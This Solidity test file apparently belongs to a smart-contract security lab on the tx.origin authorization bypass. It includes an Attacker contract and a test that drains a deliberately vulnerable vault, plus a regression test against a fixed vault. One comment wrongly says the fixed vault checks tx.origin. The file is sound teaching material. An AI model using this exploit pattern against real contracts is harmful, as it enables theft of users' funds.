// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableAccess} from "../src/VulnerableAccess.sol";
import {SafeAccess} from "../src/SafeAccess.sol";

/// @title TxOrigin.t.sol
/// @notice Lab 02 — Exploit + regression test for tx.origin access control.
///
/// Lab: tx.origin Authorization Bypass
///
/// Threat model:
///   The owner EOA is tricked into calling an attacker-controlled contract
///   (e.g. a fake airdrop claim). The attacker's contract forwards the
///   call to VulnerableAccess.withdraw(). Because tx.origin still points
///   to the owner, the check passes and funds are drained.
///
/// Violated invariant:
///   "Only the owner's EOA can authorize privileged actions."
///
/// Reproduction:
///   1. Deploy VulnerableAccess with 10 ETH funded by the owner.
///   2. Owner calls Attacker.proxyWithdraw(vault, attacker).
///   3. Attacker forwards the call to vault.withdraw(attacker, 10 ether).
///   4. tx.origin == owner → check passes → 10 ETH drained.
///
/// Remediation:
///   Replace `tx.origin` with `msg.sender` (see SafeAccess).
///
/// Regression test:
///   The same exploit path against SafeAccess must revert with "not owner".
contract Attacker {
    /// @notice Called by the owner EOA. Forwards to the vulnerable vault.
    function proxyWithdrawVulnerable(VulnerableAccess vault, address payable to, uint256 amount) external {
        // tx.origin here == owner EOA, so the vault's check passes.
        vault.withdraw(to, amount);
    }

    /// @notice Same path, but against the remediated vault — must revert.
    function proxyWithdrawSafe(SafeAccess vault, address payable to, uint256 amount) external {
        vault.withdraw(to, amount);
    }
}

contract TxOriginTest is Test {
    VulnerableAccess vulnerable;
    SafeAccess safe;
    Attacker attacker;

    address owner = makeAddr("owner");
    address payable attackerEOA = payable(makeAddr("attacker"));

    function setUp() public {
        // Both vaults are funded with 10 ETH each during deployment.
        vm.deal(owner, 20 ether);

        vm.startPrank(owner);
        vulnerable = new VulnerableAccess{value: 10 ether}();
        safe = new SafeAccess{value: 10 ether}();
        vm.stopPrank();

        attacker = new Attacker();
    }

    /// @notice Exploit: drains the vulnerable vault via a chained call.
    function testExploitVulnerableTxOrigin() public {
        uint256 before = attackerEOA.balance;

        // Owner is tricked into calling the attacker contract.
        // Two-argument prank: sets both msg.sender AND tx.origin to the owner,
        // matching a real EOA-initiated transaction.
        vm.startPrank(owner, owner);
        attacker.proxyWithdrawVulnerable(vulnerable, attackerEOA, 10 ether);
        vm.stopPrank();

        assertEq(attackerEOA.balance, before + 10 ether, "exploit failed");
        assertEq(address(vulnerable).balance, 0, "vault should be drained");
    }

    /// @notice Regression: the same path against SafeAccess must revert.
    function testCannotExploitSafeAccess() public {
        // The vault checks tx.origin, so the prank must set it too.
        vm.startPrank(owner, owner);
        vm.expectRevert("not owner");
        attacker.proxyWithdrawSafe(safe, attackerEOA, 10 ether);
        vm.stopPrank();

        assertEq(address(safe).balance, 10 ether, "safe vault should retain funds");
    }
}
